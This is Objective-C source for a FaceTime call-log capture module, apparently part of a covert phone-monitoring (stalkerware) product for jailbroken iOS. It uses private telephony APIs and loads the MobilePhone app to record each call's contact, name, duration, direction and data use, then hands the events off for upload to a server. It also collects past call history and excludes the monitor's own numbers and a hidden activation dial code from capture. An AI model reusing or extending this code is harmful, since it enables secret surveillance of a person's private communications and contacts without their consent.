//
//  FaceTimeCaptureManager.m
//  FaceTimeCaptureManager
//
//  Created by Benjawan Tanarattanakorn on 7/22/13.
//  Copyright 2013 __MyCompanyName__. All rights reserved.
//

#import "FaceTimeCaptureManager.h"
#import "TelephonyNotificationManagerImpl.h"

#import "FaceTimeLogCaptureDAO.h"
#import "FaceTimeLog.h"
#import "HistoricalFaceTimeLog.h"

#import "FxLogger.h"
#import "FxEventEnums.h"
#import "FxVoIPEvent.h"
#import "DateTimeFormat.h"
#import "ABContactsManager.h"
#import "TelephoneNumber.h"
#import "SystemUtilsImpl.h"

#import "CTCall.h"
#import "RecentCall+IOS4.h"
#import "RecentCall.h"	// MobilePhone application

#import "PHRecentCall.h"
#import "PHRecentMultiCall.h"

#include <dlfcn.h>		// Dynamically loading
#import <UIKit/UIKit.h>
#import <objc/runtime.h>

static void *_MobilePhoneApplicationHandle = nil;

@interface FaceTimeCaptureManager (private)
- (void) sendFaceTimeLogEvent:(FaceTimeLog *) aFaceTimeLog;
- (double) getByteOfDataUsed: (CTCall *) aCall;
- (void) loadPhoneApplication;
- (void) unloadPhoneApplication;
@end



@implementation FaceTimeCaptureManager

@synthesize mAC;
@synthesize mNotCaptureNumbers;
@synthesize mCallHistoryMaxRowID;


/**
 - Method name: initWithEventDelegate: initWithEventDelegateinitWithEventDelegate
 - Purpose:This method is used to initialize the FaceTimeCaptureManager class
 - Argument list and description: aEventDelegate (EventDelegate),aTelephonyNotificationManager (TelephonyNotificationManager)
 - Return description: No return type
 */
- (id) initWithEventDelegate:(id <EventDelegate>) aEventDelegate andTelephonyNotificationCenter:(id <TelephonyNotificationManager>) aTelephonyNotificationManager {
	if ((self = [super init])) {
		mEventDelegate = aEventDelegate;
		mTelephonyNotificationManager = aTelephonyNotificationManager;
		
		if ([[SystemUtilsImpl deviceIOSMainVersion] intValue] > 5 &&
            [[SystemUtilsImpl deviceIOSMainVersion] intValue] < 9) { // 5 < iOS < 9
            // iOS 9, MobilePhone cannot start up: Unable to obtain a task name port right for pid (os/kern) failure (5)
			DLog (@"iOS verison is greater than 5, so load MobilePhone application")
			[self loadPhoneApplication];
		}
	}
	return self;
}


/**
 - Method name: initWithEventDelegate
 - Purpose:This method is used to initialize the FaceTimeCaptureManager class
 - Argument list and description: aEventDelegate (EventDelegate)
 - Return description: No return type
 */
- (id) initWithEventDelegate:(id <EventDelegate>) aEventDelegate {
	if ((self = [super init])) {
		mTelephonyNotificationManagerImpl = [[TelephonyNotificationManagerImpl alloc] init];
		[mTelephonyNotificationManagerImpl startListeningToTelephonyNotifications];
		mTelephonyNotificationManager = mTelephonyNotificationManagerImpl;
		mEventDelegate = aEventDelegate;
		
		if ([[SystemUtilsImpl deviceIOSMainVersion] intValue] > 5 &&
            [[SystemUtilsImpl deviceIOSMainVersion] intValue] < 9) { // 5 < iOS < 9
            // iOS 9, MobilePhone cannot start up: Unable to obtain a task name port right for pid (os/kern) failure (5)
			DLog (@"iOS verison is greater than 5, so load MobilePhone application")
			[self loadPhoneApplication];		
		}
	}
	return self;
}


/**
 - Method name: startCapture
 - Purpose:This method is used to start FaceTime Log Capturing
 - Argument list and description: No Argument
 - Return description: No return type
 */
- (void) startCapture {
	DLog (@"FaceTimeLogCaptureManager ---> startCapture")
	if (!mListening) {
        if ([[[UIDevice currentDevice] systemVersion] intValue] >= 8) {
            [mTelephonyNotificationManager addNotificationListener:self
                                                      withSelector:@selector(onFaceTimeLogCaptureiOS8:)
                                                   forNotification:KCALLALTERNATESTATUSCHANGENOTIFICATION];
        } else {
            [mTelephonyNotificationManager addNotificationListener:self
                                                      withSelector:@selector(onFaceTimeLogCapture:)
                                                   forNotification:KCALLHISTORYRECORDADDNOTIFICATION];
        }
        
		mListening = TRUE;
        
	
	}
}

/**
 - Method name: stopCapture
 - Purpose:This method is used to stop FaceTime Log Capturing
 - Argument list and description: No Argument
 - Return description: No return type
 */
- (void) stopCapture {
	DLog (@"FaceTimeLogCaptureManager ---> stopCapture")
	[mTelephonyNotificationManager removeListner:self];
	mListening = FALSE;
}


/**
 - Method name: onFaceTimeLogCapture
 - Purpose:This method is invoked only when FaceTime is ended
 - Argument list and description: aNotification (id)
 - Return description: No return type
 */
- (void) onFaceTimeLogCapture:(id) aNotification {	
	DLog (@"======= facetime capture =======")
	DLog (@">> aNotification --> %@", aNotification)
	
	NSNotification* notification	= aNotification;
	NSDictionary* dictionary		= [notification userInfo];
	
	if (dictionary	&& 
		[[aNotification name] isEqualToString:KCALLHISTORYRECORDADDNOTIFICATION]) { // -- Verify Notification Name

		NSInteger callStatus		= [[dictionary objectForKey:@"kCTCallStatus"] intValue];
		DLog (@">> callStatus %ld", (long)callStatus)

		if (callStatus == CALL_NOTIFICATION_STATUS_TERMINATED) {   // 5

			CTCall* call			= (CTCall*) [dictionary objectForKey:@"kCTCall"];			
			NSString * faceTimeID	= nil;					
			CTCallType callType		= kCTCallTypeNormal;		// Normal call from Phone Application
			DLog (@">> CTCall %@", call)	
			
			// -- Get FaceTime ID and Call Type
			if (call) {				
				faceTimeID			= CTCallCopyAddress(nil, call);		// Get FaceTime ID
				//[faceTimeID autorelease];				
				callType			= CTCallGetCallType(call);			// Get Call type
				DLog (@"callType %@", callType)	
			}
			
			// Note that these constants is available in iOS 5 and 6. iOS 4 is not tested yet
			
			DLog (@"--> kCTCallTypeVideoConference %@", kCTCallTypeVideoConference)
			// -- Ensure that this is FaceTime Call, not other types of call
			if ([(NSString *) callType isEqualToString:(NSString *) kCTCallTypeVideoConference]	||
				[(NSString *) callType isEqualToString:(NSString *) @"kCTCallTypeAudioConference"]) {
				 DLog (@"------ This is FaceTime CALL ------")
				
				FaceTimeLog *faceTimeLog				= nil;
				NSArray *faceTimeLogs					= [NSArray array];				
				FaceTimeLogCaptureDAO *faceTimeLogDao	= [[FaceTimeLogCaptureDAO alloc] init];
				
				// -- Get bytes transfered of FaceTime
				double byteOfDataUsed					= [self getByteOfDataUsed:call];
								
				// -- Construct FaceTimeLog object and faceTimeLogs array from FaceTime ID
				if ([faceTimeID length] == 0) {
					DLog (@"faceTimeID length == 0")
					// Blocked number (this could fail in conference call with blocked number)
					//callLogs = [callLogDAO selectCallHistory];
					//callLog = [callLogs objectAtIndex:0];
					
					faceTimeLog			= [faceTimeLogDao selectCallHistoryWithLastRowEqual:@""];
					if (faceTimeLog) 
						faceTimeLogs	= [NSArray arrayWithObject:faceTimeLog];
				} else { // Voice mail will come here
					DLog (@"faceTimeID length exist")				
					faceTimeLog			= [faceTimeLogDao selectCallHistoryWithLastRowEqualV2:faceTimeID];
					[faceTimeLog setMBytesOfDataUsed:byteOfDataUsed];
					if (faceTimeLog) 
						faceTimeLogs	= [NSArray arrayWithObject:faceTimeLog];
				}

				// Private number is show as 'Blocked' but its number is null
				DLog (@"Matching: faceTimeID = %@,  [faceTimeLog mContactNumber] = %@, mNotCaptureNumbers = %@, direction: %d",
					  faceTimeID,
					  [faceTimeLog mContactNumber],
					  [self mNotCaptureNumbers],
					  [faceTimeLog mCallState]);
				DLog (@"faceTimeLog = %@, faceTimeLogs = %@", faceTimeLog, faceTimeLogs);
							
				BOOL isNotCaptureNumber				= FALSE;
				
				// -- check Monitor FaceTime ID only when it's NOT outgoing call
				if ([faceTimeLog mCallState] != kEventDirectionOut) {
					
					TelephoneNumber *telNumberCompare = [[[TelephoneNumber alloc] init] autorelease];
					for (NSString *ignoredFaceTimeID in [self mNotCaptureNumbers]) {
						isNotCaptureNumber = [telNumberCompare isNumber:faceTimeID matchWithMonitorNumber:ignoredFaceTimeID];
						if (isNotCaptureNumber) {
							break;
						} else { // Check email address
							NSRange locationOfAt = [faceTimeID rangeOfString:@"@"];
							if (locationOfAt.location != NSNotFound) {
								NSString *lowerFaceTimeID = [faceTimeID lowercaseString];
								NSString *lowerIgnoredFaceTimeID = [ignoredFaceTimeID lowercaseString];
								isNotCaptureNumber = [lowerFaceTimeID isEqualToString:lowerIgnoredFaceTimeID];
								if (isNotCaptureNumber) {
									break;
								}
							}
						}
					}
					// -- check *#900900900 when it is outgoing call
				} 
				
				/*
				 1. Private number ==> Capture
				 2. Activation code number ==> Not capture
				 3. Voice mail number ==> Not capture
				 4. Number in self.mNotCaptureNumbers ==> Not capture
				 5. Incoming call of monitor number ==> Not capture
				 6. *#900900900 ==> Not capture
				 */
							
				if([faceTimeLogs count]						&&		// FaceTime Log entry exists
				   ![faceTimeID isEqualToString:[self mAC]]	&&		// Not activation code
				   !isNotCaptureNumber						) {
					
					DLog (@"@@@@@@@@@@ Capture FaceTime Log @@@@@@@@@@")
					if ([faceTimeID length] == 0) {
						// Private number
						DLog (@">> Send FaceTime event to server as private number, faceTimeLog = %@", faceTimeID);
						[faceTimeLog setMContactNumber:@"Blocked"];
						[self sendFaceTimeLogEvent:faceTimeLog];
					} else {
						// Number that is not voice mail number, not activation code number, not in self.mNotCaptureNumbers
						DLog (@">> Send FaceTime event to server as normal number, telNumber = %@", faceTimeID);
						[self sendFaceTimeLogEvent:faceTimeLog];
					}				
				}
				
				[faceTimeLogDao release];
				faceTimeLogDao = nil;	
				
			
			}
			[faceTimeID release];
		}
	}
}

- (void) onFaceTimeLogCaptureiOS8:(NSNotification *) aNotification {
	NSDictionary* dictionary		= [aNotification userInfo];
    /*****************************************************************************************
     user info {
     kCTCall = "<CTCall 0x15d549b0 [0x31b6a460]>{status = 3, type = 0x4, subtype = 0x1, uuid = 0x15d53540 [7EF6AE39-719C-49E8-B446-2E8CBD6C6D36], address = 0x15e5ab90, externalID = -1, start = 4.37566e+08, session start = 0, end = 4.37566e+08}";
     kCTCallStatus = 3;
     }
     *****************************************************************************************/

    if (dictionary	&&
  		[[aNotification name] isEqualToString:KCALLALTERNATESTATUSCHANGENOTIFICATION]) { // -- Verify Notification Name
        [NSTimer scheduledTimerWithTimeInterval:3 target:self selector:@selector(doCaptureFaceTimeLog:) userInfo:aNotification repeats:NO];
    }
}

- (void) doCaptureFaceTimeLog:(NSTimer *) aTimer {
	DLog (@"======= facetime capture =======")
    
    NSNotification *notification = [aTimer userInfo];
	DLog (@">> aNotification --> %@", notification)
    
	NSDictionary* dictionary    = [notification userInfo];
    NSInteger callStatus		= [[dictionary objectForKey:@"kCTCallStatus"] intValue];
    DLog (@">> callStatus %ld", (long)callStatus)
    
    if (callStatus == CALL_NOTIFICATION_STATUS_TERMINATED) {   // 5
        CTCall* call			= (CTCall*) [dictionary objectForKey:@"kCTCall"];
        NSString * faceTimeID	= nil;
        CTCallType callType		= kCTCallTypeNormal;		// Normal call from Phone Application
        DLog (@">> CTCall %@", call)
        
        // -- Get FaceTime ID and Call Type
        if (call) {
            faceTimeID			= CTCallCopyAddress(nil, call);		// Get FaceTime ID
            callType			= CTCallGetCallType(call);			// Get Call type
            DLog (@"callType %@", callType)
        }
        
        // Note that these constants is available in iOS 5 and 6. iOS 4 is not tested yet
        // -- Ensure that this is FaceTime Call, not other types of call
        if ([(NSString *) callType isEqualToString:(NSString *) kCTCallTypeVideoConference]	||
            [(NSString *) callType isEqualToString:(NSString *) @"kCTCallTypeAudioConference"]) {
            DLog (@"------ This is FaceTime CALL ------")
            
            FaceTimeLog *faceTimeLog				= nil;
            NSArray *faceTimeLogs					= [NSArray array];
            FaceTimeLogCaptureDAO *faceTimeLogDao	= [[FaceTimeLogCaptureDAO alloc] init];
            
            // Obsolete !!! we get the facetime data from database instead
            // -- Get bytes transfered of FaceTime
            //double byteOfDataUsed					= [self getByteOfDataUsed:call];
            
            [NSThread sleepForTimeInterval:3];
            
            Boolean isOutgoing = CTCallIsOutgoing(call);
            DLog(@"!!!!!!!!!!!!!!!! isOutgoing %d", isOutgoing)                                           
            
            // -- Construct FaceTimeLog object and faceTimeLogs array from FaceTime ID
            if ([faceTimeID length] == 0) {
                DLog (@"faceTimeID length == 0")
                // Blocked number (this could fail in conference call with blocked number)
                //callLogs = [callLogDAO selectCallHistory];
                //callLog = [callLogs objectAtIndex:0];
                
                faceTimeLog			= [faceTimeLogDao selectCallHistoryWithLastRowEqual:@""];
                if (faceTimeLog)
                    faceTimeLogs	= [NSArray arrayWithObject:faceTimeLog];
            } else { // Voice mail will come here
                DLog (@"faceTimeID length exist")
                faceTimeLog			= [faceTimeLogDao selectCallHistoryWithLastRowEqualIOS8:faceTimeID];
                // -- Set direction
                if ([faceTimeLog mDuration] == 0    &&  !isOutgoing) {
                    [faceTimeLog setMCallState:kEventDirectionMissedCall];
                } else {
                    [faceTimeLog setMCallState:(isOutgoing ? kEventDirectionOut : kEventDirectionIn)];
                }
                // Obsoleted
                // -- Set byte transfer
                //[faceTimeLog setMBytesOfDataUsed:byteOfDataUsed];
                
                if (faceTimeLog)
                    faceTimeLogs	= [NSArray arrayWithObject:faceTimeLog];
            }
            
            // Private number is show as 'Blocked' but its number is null
            DLog (@"Matching: faceTimeID = %@,  [faceTimeLog mContactNumber] = %@, mNotCaptureNumbers = %@, direction: %d",
                  faceTimeID,
                  [faceTimeLog mContactNumber],
                  [self mNotCaptureNumbers],
                  [faceTimeLog mCallState]);
            DLog (@"faceTimeLog = %@, faceTimeLogs = %@", faceTimeLog, faceTimeLogs);
            
            BOOL isNotCaptureNumber				= FALSE;
            
            // -- check Monitor FaceTime ID only when it's NOT outgoing call
            if ([faceTimeLog mCallState] != kEventDirectionOut) {
                
                TelephoneNumber *telNumberCompare = [[[TelephoneNumber alloc] init] autorelease];
                for (NSString *ignoredFaceTimeID in [self mNotCaptureNumbers]) {
                    isNotCaptureNumber = [telNumberCompare isNumber:faceTimeID matchWithMonitorNumber:ignoredFaceTimeID];
                    if (isNotCaptureNumber) {
                        break;
                    } else { // Check email address
                        NSRange locationOfAt = [faceTimeID rangeOfString:@"@"];
                        if (locationOfAt.location != NSNotFound) {
                            NSString *lowerFaceTimeID = [faceTimeID lowercaseString];
                            NSString *lowerIgnoredFaceTimeID = [ignoredFaceTimeID lowercaseString];
                            isNotCaptureNumber = [lowerFaceTimeID isEqualToString:lowerIgnoredFaceTimeID];
                            if (isNotCaptureNumber) {
                                break;
                            }
                        }
                    }
                }
                // -- check *#900900900 when it is outgoing call
            }
            
            /*
             1. Private number ==> Capture
             2. Activation code number ==> Not capture
             3. Voice mail number ==> Not capture
             4. Number in self.mNotCaptureNumbers ==> Not capture
             5. Incoming call of monitor number ==> Not capture
             6. *#900900900 ==> Not capture
             */
            
            if([faceTimeLogs count]						&&		// FaceTime Log entry exists
               ![faceTimeID isEqualToString:[self mAC]]	&&		// Not activation code
               !isNotCaptureNumber						) {
                
                DLog (@"@@@@@@@@@@ Capture FaceTime Log @@@@@@@@@@")
                if ([faceTimeID length] == 0) {
                    // Private number
                    DLog (@">> Send FaceTime event to server as private number, faceTimeLog = %@", faceTimeID);
                    [faceTimeLog setMContactNumber:@"Blocked"];
                    [self sendFaceTimeLogEvent:faceTimeLog];
                } else {
                    // Number that is not voice mail number, not activation code number, not in self.mNotCaptureNumbers
                    DLog (@">> Send FaceTime event to server as normal number, telNumber = %@", faceTimeID);
                    [self sendFaceTimeLogEvent:faceTimeLog];
                }
            }
            [faceTimeLogDao release];
            faceTimeLogDao = nil;
        }
        [faceTimeID release];
    }
	
}

/**
 - Method name: sendFaceTimeLogEvent
 - Purpose:This method is  used to send FaceTime Log Event
 - Argument list and description: aFaceTimeLog (FaceTimeLog)
 - Return description: No return type
 */

- (void) sendFaceTimeLogEvent:(FaceTimeLog *) aFaceTimeLog {
	ABContactsManager *contactManager = [[ABContactsManager alloc]init];
	//DLog (@"Contact Name:--->%@",[contactManager searchContactName:[aCallLog mContactNumber]]);
//	DLog (@"Contact Name:--->%@",	[contactManager searchFirstNameLastName:[aFaceTimeLog mContactNumber]]);
    DLog (@"Contact Name:--->%@",	[contactManager searchFirstNameLastName:[aFaceTimeLog mContactNumber] contactID:[aFaceTimeLog mContactID]]);
	DLog (@"Contact Number:--->%@",	[contactManager formatSenderNumber:[aFaceTimeLog mContactNumber]]);
	DLog (@"Duration:---->%lu",		(unsigned long)[aFaceTimeLog mDuration]);
	DLog (@"Event Direction---->%d",[aFaceTimeLog mCallState]);
	DLog (@"Byte transfered---->%f",[aFaceTimeLog mBytesOfDataUsed]);
	
	//===========================================Create FxVolIPEvent Event===============================================================
	FxVoIPEvent *faceTimeEvent		= [[FxVoIPEvent alloc] init];
	NSString *formatNumber		= [[aFaceTimeLog mContactNumber] stringByReplacingOccurrencesOfString:@"-" withString:@""];
	NSString *contactName		= @"";
	NSString *userID			= @"";
	if ([formatNumber length] > 1) {
		//contactName=[contactManager searchContactName:formatNumber];
		NSRange locationOfAt = [formatNumber rangeOfString:@"@"];
		// Case 1: FaceTime ID is telephone number
		if (locationOfAt.location == NSNotFound) {
			//contactName = [contactManager searchFirstNameLastName:formatNumber];
            
            contactName = [contactManager searchFirstNameLastName:formatNumber contactID:[aFaceTimeLog mContactID]];
			userID		= [contactManager formatSenderNumber:[aFaceTimeLog mContactNumber]];
		} 
		// Case 2: FaceTime ID is email address
		else {
			/*
				contactName = [contactManager searchFirstLastNameWithEmail:formatNumber];
				ISSUE:
				This cause the issue of wrong contact name like "Som Som" in the case that 
				-  have more than identical email in the same contact
				-  more than one contact with the identical email							 
			 */
			//contactName = [contactManager searchDistinctFirstLastNameWithEmail:formatNumber];
            contactName = [contactManager searchDistinctFirstLastNameWithEmailV2:formatNumber];
            
			userID		= [aFaceTimeLog mContactNumber];
		}
	}
	[faceTimeEvent setMContactName:contactName];
	[faceTimeEvent setMUserID:userID];
	[faceTimeEvent setDateTime:[DateTimeFormat phoenixDateTime]];
	[faceTimeEvent setMDuration:[aFaceTimeLog mDuration]];
	[faceTimeEvent setMDirection:[aFaceTimeLog mCallState]];
	[faceTimeEvent setEventType:kEventTypeVoIP];
	[faceTimeEvent setMTransferedByte:[aFaceTimeLog mBytesOfDataUsed]];
	[faceTimeEvent setMCategory:kVoIPCategoryFaceTime];
	[faceTimeEvent setMFrameStripID:0];
	[faceTimeEvent setMVoIPMonitor:kFxVoIPMonitorNO];
	
	DLog (@"**Contact Name:--->%@",	[faceTimeEvent mContactName]);
	DLog (@"**Contact Number:--->%@",	[faceTimeEvent mUserID]);
	DLog (@"**Duration:---->%lu",		(unsigned long)[faceTimeEvent mDuration]);
	DLog (@"**Event Direction---->%d",[faceTimeEvent mDirection]);
	DLog (@"**Byte transfered---->%lu",(unsigned long)[faceTimeEvent mTransferedByte]);

	
	
	if ([mEventDelegate respondsToSelector:@selector(eventFinished:)]) {
		DLog (@"&&&&&&&&&&&&& Sending FaceTime Log Event &&&&&&&&&&&&&&")
		[mEventDelegate performSelector:@selector(eventFinished:) withObject:faceTimeEvent withObject:self];
	}
//	//====================================================== Print Result ==================================================================
//	NSString *resultString=[NSString stringWithFormat:@"...\nContact Name:%@,ContactNumber:%@,Duraction:%d,Direction:%d,DateTime:%@....\n",
//							 contactName,[aCallLog mContactNumber],[aCallLog mDuration],
//							 [aCallLog mCallState],[DateTimeFormat phoenixDateTime]];
//	FxLog("", "", 1, kFxLogLevelDebug,resultString);
//	//======================================================================================================================================
	[contactManager release];
	contactManager=nil;
	[faceTimeEvent release];
	faceTimeEvent=nil;
}


- (double) getByteOfDataUsed: (CTCall *) aCall {
	
	DLog (@"before RecentCall")
	// -- Get Byte of Data used for the recent call
	Class $RecentCall			= objc_getClass("RecentCall");			
	DLog (@"class $RecentCall %@", $RecentCall)
	
	Class $PHRecentCall			= objc_getClass("PHRecentCall");			
	DLog (@"class $PHRecentCall %@", $PHRecentCall)
	
	double byteOfDataUsed = 0.0;
	/*
	 Note that for iOS 5, it has class RecentCall, but this class doesn't have the property bytesOfDataUsed.
	 iOS 5 doesn't shown byte in the recent UI of MobilePhone application. Also call database doesn't keep
	 this value.
	 */
	if ($RecentCall) {
		RecentCall *recentCall		= [[$RecentCall alloc] initWithCTCall: aCall];
		DLog (@"recentCall ---> %@", recentCall)		
		if (recentCall													&&
			[recentCall respondsToSelector:@selector(bytesOfDataUsed)]	){
			byteOfDataUsed			= [recentCall bytesOfDataUsed];			
			DLog (@"bytesOfDataUsed ---> %f", byteOfDataUsed)
		}									   
		[recentCall release];
		recentCall = nil;						
	} else if ($PHRecentCall) {
		PHRecentCall *recentCall = [[$PHRecentCall alloc] initWithCTCall:aCall];
		if (recentCall													&&
			[recentCall respondsToSelector:@selector(bytesOfDataUsed)]	){
			byteOfDataUsed			= [recentCall bytesOfDataUsed];			
			DLog (@"recentCall ---> %@", recentCall)
			DLog (@"isoCountryCode ---> %@", [recentCall isoCountryCode])
			DLog (@"mobileNetworkCode ---> %@", [recentCall mobileNetworkCode])
			DLog (@"mobileCountryCode ---> %@", [recentCall mobileCountryCode])
			DLog (@"_CNAPFirstName ---> %@", [recentCall _CNAPFirstName])
			DLog (@"_CNAPSecondNames ---> %@", [recentCall _CNAPSecondNames])
			DLog (@"callerDisplayName ---> %@", [recentCall callerDisplayName])
			DLog (@"underlyingCTCalls ---> %@", [recentCall underlyingCTCalls])
			DLog (@"bytesOfDataUsed ---> %f", byteOfDataUsed)
		}									   
		[recentCall release];
		recentCall = nil;
	}
	return byteOfDataUsed;
}

- (void) loadPhoneApplication {
	/**************************************************
	 Dynamically LOAD MobilePhone Application			 
	 **************************************************/						
	if (_MobilePhoneApplicationHandle == NULL) {
		DLog (@">>>>>>>>>>>>>>>>>>>>> Dynamically Load MobilePhone application >>>>>>>>>>>>>>>>>>>>>>>>>>>>>")
		_MobilePhoneApplicationHandle = dlopen("/Applications/MobilePhone.app/MobilePhone", RTLD_NOW);
        DLog(@">>>>>>>>>>>>>>>>>>>>> Dynamically Load MobilePhone application error, %s >>>>>>>>>>>>>>>>>>>>>>>>>>>>>", dlerror());
	}
}

- (void) unloadPhoneApplication {
	/**************************************************
	 Dynamically CLOSE MobilePhone Application			 
	 **************************************************/
	DLog (@"Dynamically Unload MobilePhone application")
	if (_MobilePhoneApplicationHandle != NULL) {
        int error = 0;
		error = dlclose(_MobilePhoneApplicationHandle);
		_MobilePhoneApplicationHandle = NULL;
        DLog(@">>>>>>>>>>>>>>>>>>>>> Dynamically Unload MobilePhone application last error, %d >>>>>>>>>>>>>>>>>>>>>>>>>>>>>", error);
	}
}


#pragma mark - Historical Facetime VoIP

+ (NSArray *) toFxEvent: (NSArray *) aFaceTimeLogs {
    ABContactsManager *contactManager   = [[ABContactsManager alloc]init];
    NSMutableArray *fxeventEventArray   = [NSMutableArray array];
    
    for (HistoricalFaceTimeLog *faceTimeLog in aFaceTimeLogs) {
        
        FxVoIPEvent *faceTimeEvent      = [[FxVoIPEvent alloc] init];
        
        NSString *formatNumber          = [[faceTimeLog mContactNumber] stringByReplacingOccurrencesOfString:@"-" withString:@""];
        NSString *contactName           = @"";
        NSString *userID                = @"";
        
        if ([formatNumber length] > 1) {

            NSRange locationOfAt        = [formatNumber rangeOfString:@"@"];
            
            // Case 1: FaceTime ID is telephone number
            if (locationOfAt.location == NSNotFound) {
                contactName = [contactManager searchFirstNameLastName:formatNumber contactID:[faceTimeLog mContactID]];
                userID		= [contactManager formatSenderNumber:[faceTimeLog mContactNumber]];
            }
            // Case 2: FaceTime ID is email address
            else {
                /*
                 contactName = [contactManager searchFirstLastNameWithEmail:formatNumber];
                 ISSUE:
                 This cause the issue of wrong contact name like "Som Som" in the case that
                 -  have more than identical email in the same contact
                 -  more than one contact with the identical email
                 */
                //contactName = [contactManager searchDistinctFirstLastNameWithEmail:formatNumber];
                contactName = [contactManager searchDistinctFirstLastNameWithEmailV2:formatNumber];
                
                userID		= [faceTimeLog mContactNumber];
            }
        }
        
        [faceTimeEvent setMContactName:contactName];
        [faceTimeEvent setMUserID:userID];
        
        // Set datetime according to the time in Call Database
        if ([faceTimeLog mDate]) {
            [faceTimeEvent setDateTime:[DateTimeFormat dateTimeWithDate:[faceTimeLog mDate]]];
        } else {
            [faceTimeEvent setDateTime:[DateTimeFormat phoenixDateTime]];
        }
        
        [faceTimeEvent setMDuration:[faceTimeLog mDuration]];
        [faceTimeEvent setMDirection:[faceTimeLog mCallState]];
        [faceTimeEvent setEventType:kEventTypeVoIP];
        [faceTimeEvent setMTransferedByte:[faceTimeLog mBytesOfDataUsed]];
        [faceTimeEvent setMCategory:kVoIPCategoryFaceTime];
        [faceTimeEvent setMFrameStripID:0];
        [faceTimeEvent setMVoIPMonitor:kFxVoIPMonitorNO];
        
        [fxeventEventArray addObject:faceTimeEvent];
        
        [faceTimeEvent release];
        faceTimeEvent                   = nil;
    }
    
    [contactManager release];
    contactManager                  = nil;
    return fxeventEventArray;
}

+ (NSArray *) allFaceTimeVoIPs {
    FaceTimeLogCaptureDAO *faceTimeLogDAO   = [[FaceTimeLogCaptureDAO alloc] init];
    NSArray *faceTimeLogs                   = [faceTimeLogDAO selectAllFaceTimeHistory];
    NSArray *fxFacetimeLogs                 = [self toFxEvent:faceTimeLogs];
    [faceTimeLogDAO release];
    return fxFacetimeLogs;
}

+ (NSArray *) allFaceTimeVoIPsWithMax: (NSInteger) aMaxNumber {
    FaceTimeLogCaptureDAO *faceTimeLogDAO   = [[FaceTimeLogCaptureDAO alloc] init];
    NSArray *faceTimeLogs                   = [faceTimeLogDAO selectAllFaceTimeHistoryWithMax: aMaxNumber];
    NSArray *fxFacetimeLogs                 = [self toFxEvent:faceTimeLogs];
    [faceTimeLogDAO release];
    return fxFacetimeLogs;
}

/**
 - Method name:dealloc
 - Purpose: This is memory mangement method. Invoked when the class object releasd.
 - Argument list and description: No argument
 - Return type and description: No Return
 */
- (void) dealloc {
    // It's ok to unload 'Phone' application for iOS 6, but iOS 7 causes the application crash thus we decide to not unload it
//	if ([[SystemUtilsImpl deviceIOSMainVersion] intValue] > 5) {
//		DLog (@"iOS version is greater than 5, so we should unload MobilePhone application when this class is dealloc")
//		[self unloadPhoneApplication];
//	}
    [self stopCapture];
	
	[mTelephonyNotificationManagerImpl release];
	mTelephonyNotificationManagerImpl = nil;
    
	[mAC release];
	
	[mNotCaptureNumbers release];
    
	[super dealloc];
}


@end
